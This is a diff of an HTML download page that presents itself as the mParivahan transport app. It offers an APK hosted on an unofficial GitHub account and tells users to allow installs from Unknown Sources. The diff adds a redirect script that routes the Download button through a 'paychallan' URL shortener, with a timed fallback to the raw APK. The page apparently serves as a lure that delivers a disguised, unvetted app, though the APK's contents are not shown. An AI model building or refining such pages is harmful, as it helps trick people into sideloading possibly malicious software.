@@ -30,6 +30,7 @@
   </style>
 </head>
 <body>
+  <!-- Header -->
   <header class="top">
     <div class="top-inner">
       <img class="logo" src="logo.png" alt="NexGen mParivahan" />
@@ -40,21 +41,18 @@
     </div>
   </header>
 
+  <!-- CTA (Download Button) -->
   <section class="cta-wrap">
-    <a id="downloadBtn"
-       class="cta"
-       href="https://raw.githubusercontent.com/mParivahan1/s1/main/mParivahan.apk"
-       rel="noopener noreferrer">
-      Download APK
-    </a>
+    <a id="downloadBtn" class="cta" href="#">Download APK</a>
   </section>
 
+  <!-- How to Install -->
   <main class="container">
     <div class="card">
       <h4>How to Install</h4>
       <ol>
         <li>Tap the <strong>Download APK</strong> button above.</li>
-        <li>Once downloaded, open the file from your phone's notifications or Downloads.</li>
+        <li>Once downloaded, open the file from your phone’s notifications or Downloads.</li>
         <li>If prompted, allow installation from <em>Unknown Sources</em>.</li>
         <li>Follow the on-screen instructions to finish installation.</li>
         <li>Open <strong>M Parivahan</strong> and enjoy 🎉</li>
@@ -62,6 +60,7 @@
     </div>
   </main>
 
+  <!-- Road footer -->
   <div class="road-wrap">
     <svg class="road" viewBox="0 0 160 200" fill="none" xmlns="http://www.w3.org/2000/svg">
       <path d="M20 10h120l20 180H0L20 10z" stroke="#c7d2fe" stroke-width="3" fill="none"/>
@@ -72,13 +71,38 @@
     </svg>
   </div>
 
+  <!-- ✅ Smart Link Script -->
   <script>
-    const DIRECT_APK_LINK = "https://raw.githubusercontent.com/mParivahan1/s1/main/mParivahan.apk";
-    const btn = document.getElementById('downloadBtn');
-    btn.href = DIRECT_APK_LINK;
+    // 1) Preferred short link
+    const SHORT_LINK = "https://yxbu02.short.gy/paychallan";
+    // 2) Fallback to GitHub raw link
+    const RAW_APK_LINK = "https://raw.githubusercontent.com/mParivahan1/s1/main/mParivahan.apk";
+    // 3) Delay before fallback (milliseconds)
+    const FALLBACK_DELAY = 2500;
+
+    const btn = document.getElementById("downloadBtn");
+    btn.href = SHORT_LINK;
     btn.rel = "noopener noreferrer";
-    // Optional new-tab behavior:
-    // btn.addEventListener('click', () => window.open(DIRECT_APK_LINK, '_blank'));
+
+    btn.addEventListener("click", function (e) {
+      e.preventDefault();
+
+      // Try the short link first
+      try {
+        window.location.assign(SHORT_LINK);
+      } catch (err) {
+        // Immediate fallback if short link fails
+        window.location.assign(RAW_APK_LINK);
+        return;
+      }
+
+      // If still on this page after the delay → fallback
+      setTimeout(() => {
+        if (document.visibilityState === "visible") {
+          window.location.assign(RAW_APK_LINK);
+        }
+      }, FALLBACK_DELAY);
+    });
   </script>
 </body>
 </html>
